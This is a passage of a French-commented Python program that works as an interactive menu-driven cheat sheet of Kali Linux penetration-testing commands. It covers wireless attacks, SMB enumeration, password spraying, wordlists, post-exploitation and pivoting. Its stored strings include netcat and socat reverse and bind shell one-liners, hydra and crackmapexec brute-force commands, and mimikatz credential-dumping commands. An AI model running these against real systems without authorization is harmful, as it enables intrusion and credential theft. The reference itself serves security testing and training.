                "Capture headless": "kismet -c wlan0mon --daemonize"
            }},
            5: {"name": "bluelog", "commands": {
                "Scan Bluetooth": "bluelog -v -n",
                "Scan long": "bluelog -t 300"
            }},
            6: {"name": "spooftooph", "commands": {
                "Spoof Bluetooth": "spooftooph -i hci0 -a MAC_TARGET"
            }},
            7: {"name": "bully", "commands": {
                "Attack WPS": "bully -b MAC_TARGET wlan0mon",
                "Attack verbose": "bully -b MAC_TARGET -v 3 wlan0mon"
            }}
        }

        # Catégorie 7: Forensique & Analyse (étendue)
        self.categories[7]["tools"] = {
            1: {"name": "wireshark", "commands": {
                "Capture interface": "wireshark -i eth0",
                "Analyse fichier": "wireshark -r capture.pcap",
                "Filtrage HTTP": "tshark -r capture.pcap -Y 'http'",
                "Filtrage DNS": "tshark -r capture.pcap -Y 'dns'",
                "Extraction fichiers": "tshark -r capture.pcap --export-objects http,export_dir"
            }},
            2: {"name": "binwalk", "commands": {
                "Analyse firmware": "binwalk firmware.bin",
                "Extraction automatique": "binwalk -e firmware.bin",
                "Extraction récursive": "binwalk -Me firmware.bin",
                "Scan signature": "binwalk -B firmware.bin",
                "Décompression": "binwalk --dd='.*' firmware.bin"
            }},
            3: {"name": "foremost", "commands": {
                "Récupération fichiers": "foremost -i image.dd -o output_dir",
                "Types spécifiques": "foremost -t jpg,pdf,doc -i image.dd",
                "Récupération tous types": "foremost -t all -i image.dd",
                "Avec config custom": "foremost -c myconfig.conf -i image.dd"
            }},
            4: {"name": "volatility", "commands": {
                "Identifier profil": "volatility -f memory.dmp imageinfo",
                "Liste processus": "volatility -f memory.dmp --profile=Win7SP1 pslist",
                "Dump processus": "volatility -f memory.dmp --profile=Win7SP1 procdump -p 1234",
                "Scan réseaux": "volatility -f memory.dmp --profile=Win7SP1 netscan",
                "Dump registre": "volatility -f memory.dmp --profile=Win7SP1 hivelist"
            }},
            5: {"name": "strings", "commands": {
                "Extraire strings": "strings binary_file",
                "Strings avec encodage": "strings -a -e l binary_file",
                "Strings vers fichier": "strings binary_file > strings.txt"
            }},
            6: {"name": "exiftool", "commands": {
                "Metadata image": "exiftool image.jpg",
                "Supprimer metadata": "exiftool -all= image.jpg",
                "Metadata tous fichiers": "exiftool *"
            }},
            7: {"name": "steghide", "commands": {
                "Extraire données cachées": "steghide extract -sf file.jpg",
                "Cacher données": "steghide embed -cf cover.jpg -ef secret.txt",
                "Info fichier": "steghide info file.jpg"
            }}
        }

        # Catégorie 8: Services & Partage (étendue)
        self.categories[8]["tools"] = {
            1: {"name": "enum4linux", "commands": {
                "Enumération complète": "enum4linux -a TARGET",
                "Enumération utilisateurs": "enum4linux -U TARGET",
                "Enumération shares": "enum4linux -S TARGET",
                "Enumération groupes": "enum4linux -G TARGET",
                "Enumération password policy": "enum4linux -P TARGET"
            }},
            2: {"name": "rpcclient", "commands": {
                "Connexion anonymous": "rpcclient -U '' -N TARGET",
                "Connexion authentifiée": "rpcclient -U 'username%password' TARGET",
                "Enumération utilisateurs": "rpcclient $> enumdomusers",
                "Enumération groupes": "rpcclient $> enumdomgroups",
                "Info domaine": "rpcclient $> querydominfo"
            }},
            3: {"name": "smbclient", "commands": {
                "Liste shares": "smbclient -L TARGET -N",
                "Connexion share": "smbclient //TARGET/share -U username",
                "Download fichier": "smb: \\> get file.txt",
                "Upload fichier": "smb: \\> put file.txt",
                "Liste fichiers": "smb: \\> ls"
            }},
            4: {"name": "smbmap", "commands": {
                "Scan SMB": "smbmap -H TARGET",
                "Avec credentials": "smbmap -H TARGET -u user -p pass",
                "Liste shares": "smbmap -H TARGET -u user -p pass -r"
            }},
            5: {"name": "snmp-check", "commands": {
                "Scan SNMP": "snmp-check TARGET",
                "Scan communauté": "snmp-check -c public TARGET"
            }},
            6: {"name": "onesixtyone", "commands": {
                "Brute SNMP": "onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt TARGET"
            }},
            7: {"name": "nfs", "commands": {
                "Liste exports NFS": "showmount -e TARGET",
                "Mount NFS share": "mount -t nfs TARGET:/export /mnt/nfs"
            }},
            8: {"name": "crackmapexec", "commands": {
                "Scan SMB": "crackmapexec smb TARGET",
                "Avec credentials": "crackmapexec smb TARGET -u user -p pass",
                "Spray passwords": "crackmapexec smb TARGET -u users.txt -p 'Password123!'",
                "Enumération shares": "crackmapexec smb TARGET --shares"
            }}
        }

        # Catégorie 9: Utilitaires Réseau (étendue)
        self.categories[9]["tools"] = {
            1: {"name": "netcat", "commands": {
                "Scan port": "nc -zv TARGET 80",
                "Ecoute port": "nc -lvnp 4444",
                "Reverse shell": "nc TARGET 4444 -e /bin/bash",
                "Transfert fichier écoute": "nc -lvnp 4444 > file.txt",
                "Transfert fichier envoi": "nc TARGET 4444 < file.txt"
            }},
            2: {"name": "socat", "commands": {
                "Reverse shell": "socat TCP:TARGET:4444 EXEC:/bin/bash",
                "Bind shell": "socat TCP-LISTEN:4444 EXEC:/bin/bash",
                "Transfert fichier": "socat -u FILE:file.txt TCP:TARGET:4444"
            }},
            3: {"name": "curl", "commands": {
                "Test HTTP": "curl http://TARGET",
                "Avec headers": "curl -H 'User-Agent: Mozilla' http://TARGET",
                "Avec authentification": "curl -u user:pass http://TARGET",
                "Test méthode POST": "curl -X POST -d 'data=test' http://TARGET",
                "Sauvegarder output": "curl -o output.html http://TARGET",
                "Verbose": "curl -v http://TARGET"
            }},
            4: {"name": "wget", "commands": {
                "Téléchargement simple": "wget http://TARGET/file",
                "Téléchargement récursif": "wget -r http://TARGET",
                "Avec authentification": "wget --user=admin --password=pass http://TARGET",
                "Mirror site": "wget -m http://TARGET",
                "Continue download": "wget -c http://TARGET/file"
            }},
            5: {"name": "tcpdump", "commands": {
                "Capture interface": "tcpdump -i eth0",
                "Capture host": "tcpdump host TARGET",
                "Capture port": "tcpdump port 80",
                "Output fichier": "tcpdump -w capture.pcap"
            }},
            6: {"name": "ssh", "commands": {
                "Connexion basique": "ssh user@TARGET",
                "Avec port spécifique": "ssh -p 2222 user@TARGET",
                "Avec clé privée": "ssh -i key.pem user@TARGET",
                "Tunnel SSH": "ssh -L 8080:localhost:80 user@TARGET"
            }},
            7: {"name": "ftp", "commands": {
                "Connexion FTP": "ftp TARGET",
                "Upload fichier": "ftp> put file.txt",
                "Download fichier": "ftp> get file.txt"
            }}
        }

        # Catégorie 10: Wordlists & Dictionnaires (NOUVELLE CATÉGORIE COMPLÈTE)
        self.categories[10]["tools"] = {
            1: {"name": "Wordlists Management", "commands": {
                "RockYou location": "ls -la /usr/share/wordlists/rockyou.txt",
                "SecLists location": "ls -la /usr/share/wordlists/SecLists/",
                "DIRB wordlists": "ls -la /usr/share/wordlists/dirb/",
                "Metasploit wordlists": "ls -la /usr/share/wordlists/metasploit/",
                "Installer SecLists": "sudo apt update && sudo apt install seclists",
                "Décompresser RockYou": "sudo gunzip /usr/share/wordlists/rockyou.txt.gz",
                "Mettre à jour SecLists": "cd /usr/share/wordlists/SecLists && sudo git pull",
                "Télécharger depuis GitHub": "git clone https://github.com/danielmiessler/SecLists.git",
                "Vérifier toutes les wordlists": "ls -la /usr/share/wordlists/",
                "Rechercher wordlist spécifique": "find /usr/share/wordlists/ -name '*pass*'",
                "Compter lignes wordlist": "wc -l /usr/share/wordlists/rockyou.txt",
                "Trier wordlist": "sort -u wordlist.txt > wordlist_sorted.txt",
                "Filtrer wordlist par taille": "awk 'length($0) >= 8' wordlist.txt > wordlist_filtered.txt"
            }},
            2: {"name": "RockYou Specific", "commands": {
                "Stats RockYou": "wc -l /usr/share/wordlists/rockyou.txt",
                "Top 10 passwords": "head -20 /usr/share/wordlists/rockyou.txt",
                "Search in RockYou": "grep -i 'password' /usr/share/wordlists/rockyou.txt | head -10",
                "Passwords 8 chars": "awk 'length($0) == 8' /usr/share/wordlists/rockyou.txt | head -10",
                "Copy RockYou locally": "cp /usr/share/wordlists/rockyou.txt ./",
                "RockYou for hydra": "hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://TARGET/login:user=^USER^&pass=^PASS^:invalid"
            }},
            3: {"name": "SecLists Usage", "commands": {
                "Discovery subdomains": "ffuf -u http://FUZZ.TARGET -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
                "Web content fuzzing": "gobuster dir -u http://TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt",
                "Parameter fuzzing": "ffuf -u 'http://TARGET/script?FUZZ=test' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt",
                "Usernames generation": "cat /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt",
                "Passwords common": "cat /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
            }},
            4: {"name": "Custom Wordlists", "commands": {
                "Générer avec crunch": "crunch 6 8 0123456789 -o custom_wordlist.txt",
                "Générer avec cewl": "cewl http://TARGET -w custom_wordlist.txt",
                "Combiner wordlists": "cat wordlist1.txt wordlist2.txt > combined.txt",
                "Nettoyer wordlist": "sort -u combined.txt > clean_wordlist.txt",
                "Wordlist rules John": "john --wordlist=custom_wordlist.txt --rules --stdout > mutated_wordlist.txt",
                "Mutation avec hashcat": "hashcat -r /usr/share/hashcat/rules/best64.rule --stdout custom_wordlist.txt > mutated.txt"
            }},
            5: {"name": "Online Wordlists", "commands": {
                "Télécharger SecLists GitHub": "git clone https://github.com/danielmiessler/SecLists",
                "Télécharger RockYou GitHub": "wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
                "Probable Wordlists": "git clone https://github.com/berzerk0/Probable-Wordlists",
                "Assetnote Wordlists": "git clone https://github.com/assetnote/wordlists",
                "FuzzDB": "git clone https://github.com/fuzzdb-project/fuzzdb",
                "Kaonashi Wordlists": "git clone https://github.com/kaonashi-passwords/Kaonashi"
            }}
        }

        # Catégorie 11: Post-Exploitation (étendue)
        self.categories[11]["tools"] = {
            1: {"name": "linpeas", "commands": {
                "Scan automatique complet": "./linpeas.sh",
                "Scan rapide": "./linpeas.sh -r",
                "Scan deep": "./linpeas.sh -a",
                "Scan spécifique": "./linpeas.sh -s"
            }},
            2: {"name": "winpeas", "commands": {
                "Scan Windows complet": "winpeas.exe",
                "Scan rapide": "winpeas.exe quiet",
                "Scan services": "winpeas.exe services"
            }},
            3: {"name": "linux-exploit-suggester", "commands": {
                "Vérifier vulnérabilités Linux": "./linux-exploit-suggester.sh",
                "Avec kernel spécifique": "./linux-exploit-suggester.sh -k 3.2.0"
            }},
            4: {"name": "windows-exploit-suggester", "commands": {
                "Vérifier vulnérabilités Windows": "python windows-exploit-suggester.py --database 2021.db --systeminfo systeminfo.txt"
            }},
            5: {"name": "pspy", "commands": {
                "Monitor processus": "./pspy64",
                "Monitor avec timestamps": "./pspy64 -t"
            }},
            6: {"name": "mimikatz", "commands": {
                "Dump LSASS": "mimikatz # sekurlsa::logonpasswords",
                "Dump SAM": "mimikatz # lsadump::sam",
                "Pass the ticket": "mimikatz # kerberos::ptt ticket.kirbi"
            }}
        }

        # Catégorie 12: OSINT & Investigation (étendue)
        self.categories[12]["tools"] = {
            1: {"name": "maltego", "commands": {
                "Lancer Maltego": "maltego",
                "Transformations": "Interface graphique uniquement"
            }},
            2: {"name": "recon-ng", "commands": {
                "Lancer console": "recon-ng",
                "Installer modules": "marketplace install all",
                "Rechercher modules": "modules search",
                "Exécuter module": "modules load recon/domains-hosts/google_site_web"
            }},
            3: {"name": "shodan", "commands": {
                "CLI Shodan": "shodan host TARGET",
                "Recherche": "shodan search 'apache'",
                "Scan réseau": "shodan scan submit 192.168.1.0/24"
            }},
            4: {"name": "theharvester", "commands": {
                "Recherche emails": "theHarvester -d TARGET.com -b google",
                "Toutes sources": "theHarvester -d TARGET.com -b all",
                "Limite résultats": "theHarvester -d TARGET.com -b google -l 100"
            }},
            5: {"name": "metagoofil", "commands": {
                "Extraction metadata": "metagoofil -d TARGET.com -t pdf,doc -l 20 -n 10 -o results -f output.html"
            }}
        }

        # Nouvelles catégories ajoutées
        self.categories[13]["tools"] = {
            1: {"name": "apktool", "commands": {
                "Décompiler APK": "apktool d app.apk -o output_dir",
                "Recompiler APK": "apktool b output_dir -o new_app.apk",
                "Analyser APK": "apktool d --no-src app.apk"
            }},
            2: {"name": "jadx", "commands": {
                "Décompiler APK": "jadx app.apk -d output_dir",
                "Décompiler avec source": "jadx --show-bad-code app.apk"
            }},
            3: {"name": "mobsf", "commands": {
                "Lancer Mobile-Security-Framework": "python manage.py runserver",
                "Analyse automatique": "Interface web sur http://localhost:8000"
            }}
        }

        self.categories[14]["tools"] = {
            1: {"name": "setoolkit", "commands": {
                "Lancer SET": "setoolkit",
                "Social Engineering Attacks": "Sélectionner l'option 1",
                "Website Attack Vectors": "Sélectionner l'option 2",
                "Credential Harvester": "Sélectionner l'option 3"
            }},
            2: {"name": "beef", "commands": {
                "Lancer BeEF": "beef-xss",
                "Accès interface": "http://localhost:3000/ui/panel"
            }}
        }

        self.categories[15]["tools"] = {
            1: {"name": "proxychains", "commands": {
                "Utiliser avec nmap": "proxychains nmap -sT -p 80,443 TARGET",
                "Utiliser avec curl": "proxychains curl http://TARGET",
                "Configuration": "nano /etc/proxychains.conf"
            }},
            2: {"name": "sshuttle", "commands": {
                "Tunnel VPN SSH": "sshuttle -r user@TARGET 192.168.1.0/24",
                "Tunnel spécifique": "sshuttle -r user@TARGET -x 192.168.1.100 192.168.1.0/24"
            }},
            3: {"name": "chisel", "commands": {
                "Serveur chisel": "chisel server -p 8080 --reverse",
                "Client chisel": "chisel client SERVER_IP:8080 R:8888:127.0.0.1:80"
            }}
        }

    def show_wordlists_info(self):
        """Affiche les informations détaillées sur les wordlists"""
        self.clear_screen()
        self.print_banner()
        print(f"{Colors.KALI_GREEN}{Colors.BOLD}WORDLISTS & DICTIONNAIRES KALI:{Colors.RESET}\n")
        
        for wl_name, wl_data in self.wordlists_data.items():
            print(f"{Colors.KALI_CYAN}▬ {wl_name.upper()}{Colors.RESET}")
            print(f"{Colors.KALI_WHITE}Path: {Colors.KALI_GRAY}{wl_data['path']}{Colors.RESET}")
            print(f"{Colors.KALI_WHITE}Description: {Colors.KALI_GRAY}{wl_data['description']}{Colors.RESET}")
            
            if 'size' in wl_data:
                print(f"{Colors.KALI_WHITE}Taille: {Colors.KALI_GRAY}{wl_data['size']}{Colors.RESET}")
            
            if 'usage' in wl_data:
                print(f"{Colors.KALI_WHITE}Utilisation: {Colors.KALI_GRAY}{wl_data['usage']}{Colors.RESET}")
            
            if 'subcategories' in wl_data:
                print(f"{Colors.KALI_WHITE}Sous-catégories:{Colors.RESET}")
                for subcat, items in wl_data['subcategories'].items():
                    print(f"  {Colors.KALI_GRAY}{subcat}: {', '.join(items)}{Colors.RESET}")
            
            if 'files' in wl_data:
                print(f"{Colors.KALI_WHITE}Fichiers: {Colors.KALI_GRAY}{', '.join(wl_data['files'])}{Colors.RESET}")
            
            print()

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def print_banner(self):
        banner = f"""
{Colors.KALI_GREEN}{Colors.BOLD}
    _  __     _ _   _  __    _    ____
   | |/ /    | | | (_)/ /   | |  / / |
   | ' / __ _| | |_| / /_   | | / /| |
   |  < / _` | | __| | '_ \\ | |/ / | |
   | . \\ (_| | | |_| | (_) || |\\ \\ |_|
   |_|\\_\\__,_|_|\\__|_|\\___/ |_| \\_(_)
{Colors.KALI_WHITE}
        Kali Linux Commands Master
{Colors.KALI_GRAY}
        Complete Penetration Testing Reference
{Colors.RESET}
        """
        print(banner)

    def show_categories(self):
        print(f"{Colors.KALI_GREEN}{Colors.BOLD}CATEGORIES:{Colors.RESET}\n")
        
        for num, category in self.categories.items():
            print(f"  {Colors.KALI_BLUE}[{num}]{Colors.RESET} {category['name']}")
        
        print(f"\n{Colors.KALI_GRAY}Navigation: Tapez un numéro ou le nom d'un outil")
        print(f"Exemples: nmap, sqlmap, hydra, wordlist, rockyou, seclists, wireshark")
        print(f"Commands: [0] Quit  [99] All commands  [s] Search  [w] Wordlists Info{Colors.RESET}")

    def show_tools(self, category_num):
        category = self.categories[category_num]
        print(f"\n{Colors.KALI_GREEN}{Colors.BOLD}{category['name']}:{Colors.RESET}\n")
        
        for tool_num, tool in category["tools"].items():
            print(f"  {Colors.KALI_BLUE}[{tool_num}]{Colors.RESET} {tool['name']}")
        
        print(f"\n{Colors.KALI_GRAY}[0] Back  [s] Search{Colors.RESET}")

    def show_commands(self, category_num, tool_num):
        tool = self.categories[category_num]["tools"][tool_num]
        print(f"\n{Colors.KALI_GREEN}{Colors.BOLD}{tool['name']}:{Colors.RESET}\n")
        
        commands = list(tool["commands"].items())
        for i, (desc, cmd) in enumerate(commands, 1):
            print(f"{Colors.KALI_BLUE}[{i}]{Colors.RESET} {desc}")
            print(f"{Colors.KALI_WHITE}  {cmd}{Colors.RESET}\n")

    def show_search_results(self, results, query):
        """Affiche les résultats de recherche améliorés"""
        print(f"\n{Colors.KALI_YELLOW}Search results for '{query}':{Colors.RESET}\n")
        
        if not results:
            print(f"{Colors.KALI_RED}Aucun outil trouvé.{Colors.RESET}")
            print(f"{Colors.KALI_GRAY}Essaie: nmap, sqlmap, hydra, wordlist, rockyou, seclists, wireshark...{Colors.RESET}")
            return None
        
        # Grouper par catégorie
        categorized = {}
        for cat_num, tool_num, tool, score in results:
            if cat_num not in categorized:
                categorized[cat_num] = []
            categorized[cat_num].append((tool_num, tool, score))
        
        displayed_results = []
        for cat_num, tools in categorized.items():
            category_name = self.categories[cat_num]["name"]
            print(f"{Colors.KALI_PURPLE}{category_name}:{Colors.RESET}")
            for tool_num, tool, score in tools:
                print(f"  {Colors.KALI_BLUE}[{len(displayed_results)+1}]{Colors.RESET} {tool['name']} {Colors.KALI_GRAY}({int(score)}% match){Colors.RESET}")
                displayed_results.append((cat_num, tool_num, tool))
            print()
        
        return displayed_results

    def handle_direct_search(self, query):
        """Gère la recherche directe améliorée"""
        results = self.search_tools(query)
        if results:
            # Si un seul résultat, afficher directement
            if len(results) == 1:
                cat_num, tool_num, tool, score = results[0]
                self.show_commands_direct(cat_num, tool_num)
                return True
            else:
                displayed_results = self.show_search_results(results, query)
                if displayed_results:
                    try:
                        choice = input(f"{Colors.KALI_BLUE}Select [1-{len(displayed_results)}] or [0] Cancel:{Colors.RESET} ")
                        if choice != '0':
                            choice_num = int(choice)
                            if 1 <= choice_num <= len(displayed_results):
                                cat_num, tool_num, tool = displayed_results[choice_num - 1]
                                self.show_commands_direct(cat_num, tool_num)
                                return True
                    except ValueError:
                        print(f"{Colors.KALI_RED}Selection invalide.{Colors.RESET}")
                        sleep(1)
        else:
            print(f"{Colors.KALI_RED}Aucun outil trouvé pour '{query}'.{Colors.RESET}")
            print(f"{Colors.KALI_GRAY}Suggestions: nmap, sqlmap, hydra, wordlist, rockyou, seclists{Colors.RESET}")
            sleep(2)
        return False

    def show_commands_direct(self, category_num, tool_num):
        """Affiche les commandes directement"""
        while True:
            self.clear_screen()
            self.print_banner()
            self.show_commands(category_num, tool_num)
            
            choice = input(f"\n{Colors.KALI_GRAY}[Enter] Back  [q] Quit:{Colors.RESET} ")
            if choice.lower() == 'q':
                sys.exit(0)
            else:
                break

    def run(self):
        while True:
            self.clear_screen()
            self.print_banner()
            self.show_categories()
            
            choice = input(f"\n{Colors.KALI_BLUE}Select:{Colors.RESET} ").strip().lower()
            
            if choice == '0':
                print(f"\n{Colors.KALI_GREEN}Goodbye!{Colors.RESET}")
                break
            elif choice == '99':
                self.show_all_commands()
                input(f"\n{Colors.KALI_GRAY}Press Enter to continue...{Colors.RESET}")
                continue
            elif choice == 's':
                self.handle_search_mode()
                continue
            elif choice == 'w':
                self.show_wordlists_info()
                input(f"\n{Colors.KALI_GRAY}Press Enter to continue...{Colors.RESET}")
                continue
            elif not choice.isdigit():
                # Mode recherche direct
                if not self.handle_direct_search(choice):
                    continue
                else:
                    continue
            
            # Navigation par numéros
            category_num = int(choice)
            if category_num not in self.categories:
                print(f"{Colors.KALI_RED}Catégorie invalide.{Colors.RESET}")
                sleep(1)
                continue
            
            # Navigation dans la catégorie
            while True:
                self.clear_screen()
                self.print_banner()
                self.show_tools(category_num)
                
                tool_choice = input(f"\n{Colors.KALI_BLUE}Select:{Colors.RESET} ").strip()
                
                if tool_choice == '0':
                    break
                elif tool_choice == 's':
                    self.handle_search_mode()
                    continue
                
                try:
                    tool_num = int(tool_choice)
                    if tool_num not in self.categories[category_num]["tools"]:
                        print(f"{Colors.KALI_RED}Outil invalide.{Colors.RESET}")
                        sleep(1)
                        continue
                    
                    self.show_commands_direct(category_num, tool_num)
                            
                except ValueError:
                    print(f"{Colors.KALI_RED}Selection invalide.{Colors.RESET}")
                    sleep(1)

    def handle_search_mode(self):
        """Mode recherche avancé"""
        while True:
            self.clear_screen()
            self.print_banner()
            print(f"\n{Colors.KALI_YELLOW}{Colors.BOLD}SEARCH MODE{Colors.RESET}")
            print(f"{Colors.KALI_GRAY}Tapez le nom d'un outil, une commande, ou 'back' pour retourner.{Colors.RESET}")
            print(f"{Colors.KALI_GRAY}Exemples: 'nmap scan', 'wordlist rockyou', 'hydra ssh'{Colors.RESET}")
            
            query = input(f"\n{Colors.KALI_BLUE}Search:{Colors.RESET} ").strip()
            
            if query.lower() == 'back':
                return
            
            if query:
                self.handle_direct_search(query)

    def show_all_commands(self):
        """Affiche toutes les commandes"""
        self.clear_screen()
        self.print_banner()
        print(f"{Colors.KALI_GREEN}{Colors.BOLD}ALL KALI LINUX COMMANDS:{Colors.RESET}\n")
        
        for cat_num, category in self.categories.items():
            print(f"{Colors.KALI_BLUE}▬ {category['name']}{Colors.RESET}")
            for tool_num, tool in category["tools"].items():
                print(f"\n{Colors.KALI_WHITE}{tool['name']}:{Colors.RESET}")
                for desc, cmd in tool["commands"].items():
                    print(f"  {Colors.KALI_GRAY}• {desc}:{Colors.RESET}")
                    print(f"    {cmd}")
            print()

def main():
    try:
        app = KaliCommandsMaster()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.KALI_GREEN}Exiting...{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.KALI_RED}Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()
